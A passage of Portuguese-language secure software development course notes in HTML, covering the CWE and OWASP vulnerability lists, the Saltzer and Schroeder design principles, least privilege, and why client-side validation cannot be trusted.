vulnerabilidades pode ser agrupada em categorias. Isso se mostra muito útil; uma vez identificadas as categorias, podemos determinar quais são comuns e quais medidas podemos tomar para evitar que esse tipo de vulnerabilidade se repita.</p> <p>A <a href=https://cwe.mitre.org/ >Enumeração de Fraquezas Comuns (CWE)</a> é uma lista bastante extensa de fraquezas comuns. Na terminologia da comunidade CWE, uma "fraqueza" é uma categoria (tipo) de vulnerabilidade.</p> <p>Observe a diferença entre CVE e CWE: uma CWE identifica um <em>tipo</em> de vulnerabilidade, enquanto uma CVE identifica uma vulnerabilidade <em>específica</em> em uma (família de) produtos específica.</p> <p>Cada CWE possui um identificador com um número, por exemplo, CWE-20. Mencionaremos a CWE ocasionalmente. No entanto, a CWE é uma lista extensa e não podemos abranger todas as CWEs neste programa de certificação profissional.</p> <p>As pessoas identificaram os tipos mais importantes ou principais de vulnerabilidades em termos de probabilidade e gravidade. Duas das listas mais populares de tipos principais de vulnerabilidades são:</p> <ul> <li><strong>OWASP Top 10</strong> Esta <a href=https://owasp.org/www-project-top-ten/ >lista</a> , desenvolvida pelo Open Web Application Security Project (OWASP), representa um <em>"amplo consenso sobre os riscos de segurança mais críticos para aplicativos web".</em> Também é chamada de OWASP Top 10 Web Application Security Risks.</li> <li>**Lista das 25 Principais Vulnerabilidades da CWE **. Esta é uma <a href=https://cwe.mitre.org/top25>lista dos tipos de vulnerabilidades mais comuns e críticos</a>. Ela foi criada pela Equipe de Enumeração de Fraquezas Comuns (CWE) a partir da análise de dados sobre vulnerabilidades publicamente conhecidas ao longo de muitos anos. Esta lista pode ser aplicada a qualquer software, mas é especialmente comum aplicá-la a softwares que não sejam aplicativos web (já que a lista da OWASP se concentra em aplicativos web). Uma peculiaridade interessante: eles identificam fraquezas importantes além das 25 primeiras, então você pode ver números maiores que 25 associados a esta lista.</li> </ul> <p>A OWASP tem outras listas com os 10 melhores softwares para diferentes tipos de software. Por exemplo:</p> <ul> <li><a href=https://owasp.org/www-project-mobile-top-10/ >OWASP Mobile Top 10</a> - o top 10 de aplicativos móveis</li> <li><a href=https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project>Projeto OWASP de Internet das Coisas</a> - as 10 principais questões da Internet das Coisas (IoT).</li> </ul> <p>Dito isso, a lista dos 10 principais aplicativos da web é a lista dos 10 mais conhecidos da OWASP.</p> <p>Essas principais vulnerabilidades não são apenas comuns, mas tendem a resultar em vulnerabilidades graves.</p> <p>Essas listas de principais vulnerabilidades mudam com o tempo. Infelizmente, elas não mudam muito. Muitas das principais vulnerabilidades no CWE Top 25 são os mesmos tipos comuns de vulnerabilidades há décadas (por exemplo, consulte o <em>Computer Security Technology Planning Study</em> , <a href=https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf>volumes I</a> e <a href=https://csrc.nist.rip/publications/history/ande72.pdf>II</a> , de James P. Anderson, 1972), e a maioria dos principais problemas em aplicativos web são tipos comuns de vulnerabilidades em aplicativos web desde a década de 1990. Portanto, embora as coisas mudem, aprender sobre os <em>principais</em> tipos de vulnerabilidades será útil para você nos próximos anos.</p> <p>Em vários pontos do curso, você verá <strong>Notas</strong>. Essas Notas indicam que as vulnerabilidades em discussão são tão comuns que estão na lista dos 10 principais riscos de segurança de aplicativos web da OWASP e/ou na lista dos 25 principais da CWE.</p> <h2 id=valor-de-conhecer-os-principais-tipos-de-vulnerabilidades>Valor de conhecer os principais tipos de vulnerabilidades<a class=headerlink href=#valor-de-conhecer-os-principais-tipos-de-vulnerabilidades title="Permanent link">¶</a></h2> <p>Dedicaremos bastante tempo neste curso à revisão dos tipos comuns de vulnerabilidades. O risco é que você pense que isso é tudo o que precisa para desenvolver software seguro. Isso não é verdade.</p> <p>Evitar erros comuns <strong><em>não</em></strong> é suficiente, por si só, para tornar o software seguro.</p> <p>Mas, dependendo de como você mede as coisas, de 90% a 99% ou mais das vulnerabilidades são cobertas por essas listas principais.</p> <p>Ao prevenir erros comuns, você reduzirá o número de vulnerabilidades em pelo menos uma ordem de magnitude! Isso torna o conhecimento – e o combate – dos tipos comuns de vulnerabilidades muito valioso, pois tornará seu software muito mais seguro. Dizer " <em>nunca cometa erros"</em> é impraticável.</p> <p>Em contraste, é prático focar na identificação e no gerenciamento dos tipos mais comuns de erros que levam a vulnerabilidades. Parte da razão pela qual essas vulnerabilidades são comuns é que a maioria dos desenvolvedores não sabe o que elas são; saber o que são é o primeiro passo para gerenciá-las.</p> <p>Identificar tipos comuns de vulnerabilidades também tem outra vantagem: ajuda a identificar <em>outros</em> tipos de vulnerabilidades. Como já observamos, não há substituto para o pensamento.</p> <p>Mas muitos desenvolvedores acham difícil visualizar seus sistemas como um invasor o faria. Ao analisar os tipos comuns de vulnerabilidades do passado, você pode se tornar mais sensível às vulnerabilidades em geral. Portanto, embora conhecer os tipos comuns de vulnerabilidades não <em>substitua</em> o pensamento, conhecê-los pode <em>ajudá</em>-lo a pensar.</p> <h2 id=o-que-sao-principios-de-design-de-seguranca>O que são princípios de design de segurança?<a class=headerlink href=#o-que-sao-principios-de-design-de-seguranca title="Permanent link">¶</a></h2> <p>Ao escrever software não trivial, você precisa dividir o problema em componentes menores que funcionem juntos.</p> <p>Esse processo de decidir como dividir um problema em componentes e como eles funcionarão juntos é chamado de <em>design</em> ou <em>projeto arquitetônico</em>.</p> <p>Por exemplo, você está projetando quando tenta decidir como dividir um problema em um conjunto específico de classes e métodos.</p> <p>O resultado dessas decisões também é chamado de design ou projeto arquitetônico. A palavra "design" também é usada para descrever o design de interface do usuário, mas esse não é o sentido que queremos usar aqui.</p> <p>Lembre-se de que o processo de design, como qualquer outro processo de desenvolvimento de software, não acontece apenas uma vez. É muito comum tentar implementar um software, perceber que o design não funciona e, então, alterá-lo. Muitas vezes, é preciso alterar o design quando se muda o que o software faz. Portanto, o processo de design acontece sempre que você pensa em mudar a forma como o problema é analisado no software.</p> <p>Alguns designs são melhores que outros: alguns são mais fáceis de manter, mais rápidos e assim por diante. Em particular, alguns designs são mais seguros que outros. Não existe um truque mágico que garanta a segurança do seu design. Mas as pessoas desenvolvem software há décadas e, com a experiência, identificaram um conjunto de <em>princípios de design</em> que podem ajudar você a escolher bons designs em vez dos ruins.</p> <p>Princípios de design são guias amplamente precisos baseados em experiência e prática. Em outras palavras, princípios de design são regras práticas para ajudar você a evitar rapidamente um design ruim e guiá-lo para um bom design.</p> <p><strong>Princípios de design seguro não garantem segurança, no entanto; eles são uma ajuda para pensar, não um substituto para o pensamento</strong>.</p> <p>Por exemplo, às vezes um princípio não se aplica de forma alguma.</p> <p>Às vezes, os princípios entram em conflito; por exemplo, um princípio de design seguro é manter as coisas simples, mas às vezes você precisa de mais complexidade para fazer outra coisa.</p> <p>Em casos mais raros, pode haver boas razões do ponto de vista da segurança para até mesmo violar completamente um princípio. Dito isso, seu software geralmente será mais seguro se você pensar em princípios de design seguro e tentar aplicá-los.</p> <p>Princípios de design seguro são sabedoria destilada, e você seria sensato em considerá-los.</p> <p>Ao pensar em seu design, você precisa pensar em quais componentes você pode confiar (e em que medida) e em quais componentes você não pode necessariamente confiar.</p> <p>Alguns princípios de design falam sobre um <em>limite de confiança</em>.</p> <p>O limite de confiança é simplesmente o limite entre os componentes em que você confia e os componentes em que você não necessariamente confia. A localização do limite de confiança depende do software que você está desenvolvendo:</p> <ul class=task-list> <li class=task-list-item> <p><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Se você estiver escrevendo um aplicativo do lado do servidor, presumivelmente confia no que está sendo executado (por exemplo, o computador, o sistema operacional e o tempo de execução do contêiner, se houver), mas não nos sistemas clientes externos (alguns dos quais podem ser controlados por um invasor). O limite de confiança é entre o servidor e os clientes.</p> </li> <li class=task-list-item> <p><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Se você estiver desenvolvendo um aplicativo móvel (smartphone) que se comunica com um servidor que você controla, presumivelmente confia nesse servidor remoto. Você não deve confiar no caminho de comunicação entre seu aplicativo móvel e o servidor (portanto, você precisará usar TLS para criptografá-lo). Você certamente não deve confiar em outros aplicativos no smartphone, a menos que tenha um motivo especial para confiar em um. Portanto, claramente, há uma fronteira entre seu aplicativo móvel e (1) a Internet em geral e (2) outros aplicativos móveis. A confiança geralmente não é absoluta; você provavelmente confia que o sistema operacional do smartphone móvel será executado para aquele usuário, mas esse usuário pode ser um invasor, então você provavelmente deve garantir que alguns segredos nunca cheguem ao aplicativo móvel.</p> </li> </ul> <h2 id=principios-de-design-seguro-amplamente-recomendados>Princípios de design seguro amplamente recomendados<a class=headerlink href=#principios-de-design-seguro-amplamente-recomendados title="Permanent link">¶</a></h2> <p>O software tem sido alvo de ataques há décadas, e muitos princípios-chave de design seguro foram identificados em 1975 por Jerome H. Saltzer e Michael D. Schroeder (S&amp;S) em seu artigo " <em><a href=http://web.mit.edu/Saltzer/www/publications/protection/index.html>A Proteção da Informação em Sistemas Computacionais"</a></em>.</p> <p>O melhor dessa lista é que ela resistiu ao teste do tempo; esses princípios são igualmente importantes hoje. Outros princípios foram identificados desde então, mas vamos começar com a lista deles.</p> <p>Na lista, eles se concentram no <em>sistema de proteção</em> — ou seja, a parte do sistema da qual a segurança depende. Aqui está a lista, juntamente com alguns nomes alternativos:</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Menor Privilégio</td> <td>Cada usuário (humano) e programa deve operar com o menor número possível de privilégios. Este princípio limita os danos causados ​​por acidentes, erros ou ataques. Também reduz o número de interações potenciais entre programas privilegiados, reduzindo a probabilidade de ocorrência de usos não intencionais, indesejados ou indevidos de privilégios.</td> </tr> <tr> <td>Medição Completa</td> <td>Toda tentativa de acesso deve ser verificada; posicione o mecanismo de forma que ele não possa ser subvertido. Um sinônimo para esse objetivo é a não-ignorância.</td> </tr> <tr> <td>Economia de Mecanismo</td> <td>O sistema, em particular a parte da qual a segurança depende, deve ser o mais simples e pequeno possível.</td> </tr> <tr> <td>Design Aberto</td> <td>O mecanismo de proteção não deve depender da ignorância do invasor. Em vez disso, você deve agir como se o mecanismo fosse de conhecimento público e, em vez disso, depender do sigilo de relativamente poucos itens facilmente alteráveis, como senhas ou chaves privadas. Um invasor não deve ser capaz de invadir um sistema só porque sabe como ele funciona. "Segurança pela obscuridade" geralmente não funciona.</td> </tr> <tr> <td>Padrões de Segurança contra Falhas</td> <td>A instalação padrão deve ser a instalação segura. Se não houver certeza de que algo deve ser permitido, não permita.</td> </tr> <tr> <td>Separação de Privilégios</td> <td>O acesso a objetos deve depender de mais de uma condição (como ter uma senha). Dessa forma, se um invasor conseguir quebrar uma condição (por exemplo, roubando uma chave), o sistema permanecerá seguro. <em>Observação:</em> às vezes, os programas são divididos em partes, cada parte com um privilégio diferente. Essa abordagem às vezes é confusamente chamada de "separação de privilégios" — mas dividir um programa em partes com privilégios diferentes é outra história. Nessa terminologia, isso é um exemplo de privilégio mínimo.</td> </tr> <tr> <td>Mecanismo Menos Comum</td> <td>Minimize a quantidade e o uso de mecanismos compartilhados. Evite compartilhar arquivos, diretórios, execução do kernel do sistema operacional ou computadores com algo em que você não confia, pois invasores podem explorá-los.</td> </tr> <tr> <td>Aceitabilidade Psicológica</td> <td>A interface humana deve ser projetada para facilitar o uso, para que os usuários utilizem os mecanismos de proteção de forma correta, rotineira e automática.</td> </tr> </tbody> </table> <p>Desde então, outros princípios de design seguro também foram identificados por diferentes pessoas; abordaremos alguns deles ao longo dos cursos deste programa.</p> <p>Lembre-se de que os princípios de design são simplesmente regras práticas. Ao decompor seu problema para resolvê-lo, você deve pensar nesses princípios, pois eles o ajudarão a criar um software mais seguro. Há alguns casos em que você terá bons motivos para <em>não</em> aplicá-los. Esses princípios não substituem o pensamento — eles o ajudam a se <em>orientar</em> enquanto você pensa.</p> <p>A seguir, examinaremos mais detalhadamente alguns desses princípios, pois eles têm ramificações que podem não ser óbvias. Começaremos analisando o <em>privilégio mínimo</em>.</p> <h2 id=privilegio-minimo-maneiras-de-implementar-o-privilegio-minimo>Privilégio Mínimo: Maneiras de Implementar o Privilégio Mínimo<a class=headerlink href=#privilegio-minimo-maneiras-de-implementar-o-privilegio-minimo title="Permanent link">¶</a></h2> <p>Já observamos que o privilégio mínimo é um princípio importante de design seguro.</p> <p>A ideia básica é que cada usuário (humano ou programa) deve operar com o menor número de privilégios possível. Em geral, não permita a leitura ou gravação de informações, a menos que seja necessário para esse usuário.</p> <p>O privilégio mínimo limita o dano potencial de um ataque e também reduz a complexidade das interações relacionadas à segurança. Isso se estende até mesmo aos componentes internos de um programa: apenas a menor parte de um programa que precisa de privilégios deve (idealmente) tê-los. É claro que, em algum momento, isso se torna muito complicado de implementar (e também queremos manter o programa o mais simples possível).</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Não conceda privilégios especiais a um programa</td> <td>Se isso puder ser feito, faça-o, pois é o melhor do ponto de vista da segurança. Por exemplo, o Linux permite que programas sejam configurados <strong>com setuid</strong> ou <strong>setgid</strong> , então simplesmente executar o programa concede a ele os privilégios de seu dono. Se você puder evitar completamente o uso desse mecanismo, considere fazê-lo, pois ele concede privilégios especiais aos programas. Muitas vezes, existem alternativas mais seguras; por exemplo, exigir que as pessoas façam login com privilégios específicos (este é o propósito do <strong>sudo</strong> ).</td> </tr> <tr> <td>Minimize os privilégios especiais que um programa obtém, incluindo a minimização de quaisquer dados acessíveis a ele</td> <td>No Linux, você pode ter um programa sob (ou executado em nome de) um grupo ou usuário especial que possui apenas direitos específicos, em vez de algo mais privilegiado (como root). Se você estiver chamando uma interface de consulta de um sistema de banco de dados, limite os direitos do usuário do banco de dados que o aplicativo utiliza. Se o seu sistema de banco de dados usa SQL, você pode usar o comando SQL GRANT para limitar os privilégios que o programa obtém. Usuários do Redis podem usar o comando ACL do Redis para limitar privilégios.</td> </tr> <tr> <td>Desista permanentemente dos privilégios o mais rápido possível</td> <td>Por exemplo, se você estiver usando IDs de grupo, IDs de usuário ou recursos salvos no Linux, remova permanentemente esses privilégios extras o mais rápido possível. Dessa forma, se o ataque ocorrer posteriormente, o invasor não poderá explorar esses privilégios.</td> </tr> <tr> <td>Se você não puder abrir mão permanentemente dos privilégios, tente minimizar o tempo em que o privilégio estará ativo</td> <td>Isso é menos eficaz porque alguns ataques podem forçar programas a executar código arbitrário. Mas alguns ataques só conseguem fazer com que os programas executem um número limitado de ações, e minimizar quando o privilégio está ativo reduzirá o que um invasor pode fazer.</td> </tr> <tr> <td>Divida o programa em diferentes módulos e conceda privilégios especiais a apenas um ou alguns módulos (partes do programa)</td> <td>O módulo privilegiado idealmente nem confiará totalmente nas outras partes do seu programa (também conhecido como um <em>design mutuamente suspeito</em> ). Se você fizer isso, se alguma parte do seu programa for subvertida, isso limitará o que um invasor pode fazer imediatamente. Por exemplo, você pode dividir a parte de um programa que implementa uma GUI de uma parte diferente com privilégios. Mecanismos de separação como contêineres, máquinas virtuais, Linux seccomp e vários tipos de wrappers de segurança podem ajudá-lo a separar partes do seu programa para que a subversão de uma parte não necessariamente quebre outra. <em><strong>Cuidado:</strong> certifique-se de configurar esses mecanismos para separar os módulos com segurança e limitar os privilégios em cada parte.</em> Esses mecanismos de separação geralmente não são infalíveis, então não presuma que usá-los torna seu programa automaticamente seguro. Dito isso, eles podem tornar seu programa mais difícil de atacar e podem reduzir os danos se um ataque for bem-sucedido.</td> </tr> <tr> <td>Minimizar (limitar) a superfície de ataque</td> <td>A <em>superfície de ataque</em> é o conjunto de operações (por exemplo, sua API e suas portas de rede abertas) que um invasor em potencial pode acessar. Por exemplo, se você permitir acesso público a um método, estará concedendo a todos os invasores acesso a esse método. Tem certeza de que precisa? Sempre que possível, limite as operações que um invasor em potencial pode acessar. Se o público não precisar de acesso, não conceda acesso a ele. Em particular, evite deixar operações de depuração em sistemas de produção que um invasor possa acessar; operações de depuração são uma fonte comum de problemas.</td> </tr> <tr> <td>Valide (verifique) a entrada antes de aceitá-la</td> <td>Não aceite simplesmente dados de um possível invasor; verifique-os cuidadosamente antes de aceitá-los. Discutiremos a validação de entrada com mais detalhes posteriormente. É claro que você precisa garantir que invasores não consigam contornar essa validação de entrada; esta é uma questão tão grave que tem seu próprio princípio: <em>a mediação completa</em> , também conhecida como <em>não-ignorabilidade</em>. Falaremos sobre isso a seguir.</td> </tr> <tr> <td>Coloque seu programa em uma sandbox</td> <td>Execute intencionalmente seu programa (ou parte dele) em um ambiente com recursos intencionalmente restritos.</td> </tr> <tr> <td>Minimize privilégios para arquivos e outros recursos</td> <td>Por exemplo, normalmente, você não deve ter arquivos graváveis ​​por todos (mesmo que legíveis por todos seja frequentemente questionável). No Android, um arquivo gravável por todos pode ser alterado por um aplicativo diferente (possivelmente malicioso).</td> </tr> <tr> <td></td> <td></td> </tr> <tr> <td></td> <td></td> </tr> </tbody> </table> <p><strong>Observação:</strong> Permissões incorretas são uma causa tão comum de vulnerabilidades de segurança que figuram no CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/22 title="GitHub Issue: squidfunk/mkdocs-material #22">#22</a> de 2021 e no CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/15 title="GitHub Issue: squidfunk/mkdocs-material #15">#15</a> de 2019. Trata-se <a href=https://cwe.mitre.org/data/definitions/732.html>do CWE-732</a> ( <em>Atribuição de Permissão Incorreta para Recurso Crítico</em> ). Permissões incorretas são especialmente prejudiciais se as permissões <em>padrão forem inseguras; esse caso especial é</em> <a href=https://cwe.mitre.org/data/definitions/276.html>o CWE-276</a> ( <em>Permissões Padrão Incorretas</em> ).</p> <h1 id=exemplos-de-privilegio-minimo>Exemplos de privilégio mínimo<a class=headerlink href=#exemplos-de-privilegio-minimo title="Permanent link">¶</a></h1> <p>Vejamos alguns exemplos específicos.</p> <p>Ao desenvolver aplicativos baseados na web, não permita que os usuários acessem (leiam) arquivos como os arquivos <strong>de inclusão</strong> e <strong>configuração</strong> do servidor. Esses dados podem acidentalmente fornecer informações suficientes (por exemplo, senhas) para invadir o sistema. Se você estiver usando um servidor web tradicional, mantenha tudo o que não precisa ser servido diretamente aos usuários fora da "raiz de documentação" ( <strong>DOCROOT</strong> ); dessa forma, invasores não conseguirão nem mesmo solicitar as informações facilmente. Negue o fornecimento de arquivos que você sabe que não devem ser servidos diretamente (como arquivos <strong>de inclusão ).</strong></p> <p>Não permita que usuários gravem arquivos de configuração do sistema por padrão (por exemplo, arquivos de sistema em <strong>/etc</strong> no Linux e Unix) e, sempre que possível, considere impedir leituras por usuários comuns também. O problema é que administradores de sistema frequentemente colocam senhas e chaves em arquivos de configuração. Se houver motivos para conceder permissões de leitura mais amplas para algumas das informações de configuração do sistema (por exemplo, em <strong>/etc</strong> ), considere criar um diretório de configuração do sistema em vez de um arquivo de configuração do sistema onde o nome do diretório termina convencionalmente em <strong>.d</strong>. Diretórios de configuração do sistema geralmente são melhores de qualquer maneira porque facilitam para gerenciadores de pacotes adicionar e remover arquivos de configuração específicos. Por segurança, diretórios de configuração do sistema não apenas reduzem o risco de erro, mas arquivos específicos (como aqueles com chaves secretas e senhas) podem ter permissões mais restritas. Se você usar um diretório de configuração do sistema, será menos problemático permitir a leitura do usuário, porque é muito mais fácil proteger as chaves secretas e senhas.</p> <p>Se você implementar uma API externa (por exemplo, com REST ou GraphQL), não forneça uma operação <em>de gravação, a menos que espere que ela seja usada. Se você permitir gravações, tente limitar ao máximo</em> <em>quem</em> pode gravar. Por exemplo, tenha <em>proprietários</em> de dados específicos e permita que apenas os proprietários modifiquem esses dados, em vez de permitir que qualquer pessoa modifique qualquer coisa. Se possível, projete seu software de forma que ele não possa gravar dados, <em>mesmo</em> que sejam subvertidos por um invasor (embora isso muitas vezes não seja prático).</p> <p>Infelizmente, é comum gerenciar privilégios incorretamente. Por exemplo, há muitos casos em que programas falharam em remover privilégios em todos os casos (por exemplo, porque o lançamento de uma exceção ignorou o código que removeu os privilégios, ou porque o código que deveria remover privilégios não funciona em todos os casos).</p> <p><strong>Observação:</strong> o gerenciamento inadequado de privilégios é uma causa tão comum de vulnerabilidades de segurança que está na lista CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/29 title="GitHub Issue: squidfunk/mkdocs-material #29">#29</a> de 2021 e na lista CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/24 title="GitHub Issue: squidfunk/mkdocs-material #24">#24</a> de 2019. É <a href=https://cwe.mitre.org/data/definitions/269.html>CWE-269</a> ( <em>Gerenciamento Inadequado de Privilégios</em> ).</p> <h2 id=mediacao-completa-nao-evitabilidade>Mediação Completa (Não-Evitabilidade)<a class=headerlink href=#mediacao-completa-nao-evitabilidade title="Permanent link">¶</a></h2> <p>Sempre que um programa recebe uma solicitação, pelo menos de uma fonte na qual não pode confiar completamente (está fora do limite de confiança), o programa deve verificar a solicitação. Exemplos de verificações de segurança incluem verificar se a solicitação foi autorizada e se a entrada é válida antes de agir com base nesses dados. Esse princípio também é chamado de <em>não-ignorância,</em> pois a questão é que não deve ser possível para um invasor contornar as verificações de segurança.</p> <p>Um erro comum é tentar executar verificações de segurança em um sistema que o invasor pode controlar. Se um invasor puder controlar um sistema, ele poderá facilmente ignorar todas as verificações de segurança executadas por esse sistema. Vejamos alguns exemplos de designs <em>inseguros</em>.</p> <h2 id=design-inseguro-validacao-de-entrada-html-do-lado-do-cliente>Design Inseguro: Validação de Entrada HTML do Lado do Cliente<a class=headerlink href=#design-inseguro-validacao-de-entrada-html-do-lado-do-cliente title="Permanent link">¶</a></h2> <p>Um exemplo simples de design inseguro é quando uma aplicação web do lado do servidor envia HTML para um cliente, e o HTML inclui alguns requisitos de validação. Por exemplo, o HTML pode incluir a seguinte instrução para exigir que o comprimento máximo seja de no máximo 100:</p> <p><code>&lt;input id="name" type="text" maxlength="100"&gt;</code></p> <p>Este HTML é adequado se sua finalidade for uma verificação rápida para evitar erros acidentais. Mas, como os invasores podem controlar seu próprio navegador, essa verificação de comprimento máximo é fácil de contornar. Um invasor pode facilmente enviar uma entrada muito mais longa. Você não pode <em>depender</em> do navegador para realizar qualquer verificação relevante de segurança para você, caso o invasor possa controlar ou substituir o navegador.</p> <h2 id=design-inseguro-validacao-de-entrada-javascriptwasm-do-lado-do-cliente>Design Inseguro: Validação de Entrada JavaScript/WASM do Lado do Cliente<a class=headerlink href=#design-inseguro-validacao-de-entrada-javascriptwasm-do-lado-do-cliente title="Permanent link">¶</a></h2> <p>Um projeto inseguro comum e relacionado ocorre quando o código é enviado para navegadores da web, por exemplo, como JavaScript ou WebAssembly (WASM), e esse código realiza verificações de segurança antes de enviar seus dados para um servidor. Na maioria das situações, um invasor pode controlar o navegador da web enquanto o servidor está sob seu controle; portanto, novamente, você não pode confiar em nada que o navegador da web faça. Em outras palavras, qualquer verificação de segurança no código enviado ao navegador pode ser facilmente ignorada por um invasor, já que os invasores controlam seus próprios navegadores da web. Um problema relacionado é fornecer acesso direto ao banco de dados para usuários não confiáveis. Muitas vezes, os usuários não precisam de acesso total, o que lhes concede muito mais privilégios do que eles precisam (violando o privilégio mínimo), e esse acesso pode dificultar a prevenção de desvios nas verificações de segurança. A figura a seguir mostra esse erro:</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=../img/Pasted%20image%2020250518191646.png><img alt="Pasted image 20250518191646.png" src=../img/Pasted%20image%2020250518191646.png></a></p> <h2 id=design-seguro-validacao-de-entrada-em-um-ambiente-confiavel>Design Seguro: Validação de Entrada em um Ambiente Confiável<a class=headerlink href=#design-seguro-validacao-de-entrada-em-um-ambiente-confiavel title="Permanent link">¶</a></h2> <p>Você pode usar JavaScript com segurança, basta fazê-lo corretamente. Você pode enviar JavaScript para o cliente e realizar algumas verificações relevantes de segurança no navegador (por exemplo, para fornecer um feedback rápido). Mas se os invasores pudessem controlar alguns navegadores (mas não os servidores), as verificações de segurança do lado do navegador seriam irrelevantes para a segurança. Nesse caso comum, você precisa realizar todas as verificações de entrada relacionadas à segurança nos servidores, mesmo que algumas das verificações devessem ser feitas no cliente e agora estejam sendo "refeitas". As verificações de entrada (validações) não estão sendo realmente refeitas, porque as do lado do cliente não eram confiáveis.</p> <p>A figura a seguir mostra um design semelhante, porém seguro; observe que todas as verificações relacionadas à segurança estão sendo feitas no servidor, pois, neste caso, é nesse sistema que podemos confiar. Isso também impede o acesso direto ao banco de dados, o que geralmente é uma boa ideia se os usuários não precisarem de acesso direto:</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=../img/Pasted%20image%2020250518191718.png><img alt="Pasted image 20250518191718.png" src=../img/Pasted%20image%2020250518191718.png></a></p> <h2 id=design-inseguro-aplicativo-movel-com-verificacao-do-lado-do-cliente>Design Inseguro: Aplicativo Móvel com Verificação do Lado do Cliente<a class=headerlink href=#design-inseguro-aplicativo-movel-com-verificacao-do-lado-do-cliente title="Permanent link">¶</a></h2> <p>Um design inseguro comum semelhante é o código em aplicativos móveis para smartphones que realiza todas as verificações de segurança antes de enviar seus dados para um servidor. Novamente, não podemos presumir que quaisquer verificações de segurança no aplicativo móvel serão realmente realizadas. Um invasor pode modificar o aplicativo móvel ou criar um aplicativo diferente para contornar quaisquer verificações realizadas no aplicativo móvel. Se você estiver criando um aplicativo móvel para smartphones, normalmente também não pode confiar nos outros aplicativos – os outros aplicativos podem ser maliciosos!</p> <h2 id=design-inseguro-aplicativo-cliente-dependendo-de-um-servidor-nao-confiavel>Design inseguro: aplicativo cliente dependendo de um servidor não confiável<a class=headerlink href=#design-inseguro-aplicativo-cliente-dependendo-de-um-servidor-nao-confiavel title="Permanent link">¶</a></h2> <p>Não se confunda; a mensagem não é <em>"servidor bom, cliente ruim"</em>. O problema é que, em quase todos os casos, qualquer código em que você precise confiar deve ser executado em um ambiente confiável.</p> <p>Se você estiver escrevendo um navegador da web, por exemplo, precisará confiar nos serviços do sistema operacional local, mas certamente não pode confiar em servidores web remotos arbitrários - alguns desses servidores web remotos podem enviar dados maliciosos!</p> <h1 id=a-chave-execute-codigo-confiavel-em-um-ambiente-confiavel>A chave: execute código confiável em um ambiente confiável<a class=headerlink href=#a-chave-execute-codigo-confiavel-em-um-ambiente-confiavel title="Permanent link">¶</a></h1> <p>Resumindo: qualquer código em que você precise confiar deve (na maioria dos casos) ser executado em um ambiente confiável, <em>não</em> em um sistema potencialmente controlado por um invasor.</p> <p>Você pode usar JavaScript do lado do cliente, WebAssembly do lado do cliente e aplicativos móveis — esse não é o problema. Você também pode escrever navegadores web! O problema é confiar em um sistema que pode estar sob o controle de um invasor. Se você tem um sistema cliente-servidor baseado na web, por exemplo, geralmente, o código que roda no servidor (que você controla) deve fazer toda a verificação de segurança. Afinal, invasores podem construir ou modificar seus próprios clientes web, incluindo qualquer JavaScript enviado ao cliente por um servidor. É aceitável executar verificações em um sistema no qual você não confia totalmente se quiser fornecer uma resposta rápida para erros não intencionais. Mas isso não é suficiente — para segurança, todas as verificações de segurança precisam ser feitas (ou refeitas) em um sistema no qual você pode confiar totalmente. Você pode executar essas verificações do lado do servidor usando JavaScript, WebAssembly ou qualquer outro sistema em que você confie — mas precisa executá-las em um sistema em que você possa confiar.</p> <p>Alguns desenvolvedores tentam executar código em sistemas nos quais não confiam usando ofuscação. Ou seja, eles usam ferramentas que tentam dificultar a compreensão do código enviado a um sistema no qual não confiam. Um exemplo disso é usar a minificação de JavaScript na esperança de que isso torne o código do cliente difícil de entender. <strong>Não faça isso!</strong> O objetivo da minificação de JavaScript é reduzir o número de bytes enviados pela rede, não ocultar o que o código faz ou impedir alterações.</p> <p>O que pode ser ofuscado pode ser desofuscado, e é notavelmente fácil para invasores desofuscarem informações. Existem muitas ferramentas que podem desofuscar informações rapidamente. Tentar executar código confiável em sistemas nos quais você não pode confiar é melhor evitar.</p> <h2 id=sinais-de-alerta>Sinais de alerta<a class=headerlink href=#sinais-de-alerta title="Permanent link">¶</a></h2> <p>Construir um sistema com verificações de segurança que possam ser burladas é um erro perigoso. Isso não só significa que o sistema é inseguro, como também costuma ser muito difícil corrigir esse erro depois que ele é cometido. Pode ser necessário reescrever muitos softwares para corrigi-lo. Aqui está uma lista rápida de coisas a serem observadas que podem indicar esses tipos de erros:</p> <ul> <li>HTML ou outro formato de dados enviado a um cliente que realiza validação de entrada relevante para a segurança em um sistema que um invasor pode controlar. Isso pode ser aceitável, mas somente se todas essas verificações forem executadas novamente em um ambiente confiável.</li> <li>JavaScript ou outro código enviado ao cliente que realiza validação de entrada ou outras operações relevantes para a segurança em um sistema que um invasor possa controlar. Isso pode ser aceitável, mas somente se todas essas verificações forem executadas novamente em um ambiente confiável.</li> <li>Um aplicativo móvel que realiza validação de entrada relevante para a segurança. Este é o mesmo problema do lado do cliente.</li> <li>Um banco de dados que é diretamente acessível pela rede para uso por um aplicativo cliente (navegador da web, aplicativo móvel, etc.). Isso pode ser seguro, mas você deve garantir que todas as operações que o usuário tem permissão para executar sejam autorizadas. Em muitos sistemas, você pode controlar isso com o comando SQL GRANT, se precisar. No entanto, geralmente é melhor (ou necessário) mediar o acesso usando um programa em vez de fornecer acesso direto a um banco de dados. O acesso direto ao banco de dados pode dificultar a validação de entrada. Muitas vezes, isso viola o privilégio mínimo, já que muitas vezes o usuário não precisa de acesso total ao banco de dados. Se você fornecer acesso direto a um banco de dados, considere limitar os privilégios. Por exemplo, você pode conceder acesso apenas a uma visualização somente leitura de apenas parte do banco de dados.</li> <li>Um canal de comunicação de rede que um invasor pode sequestrar. Conexões de rede implementadas corretamente que usam TLS (como <strong>https:</strong> ) e SSH resistem ao 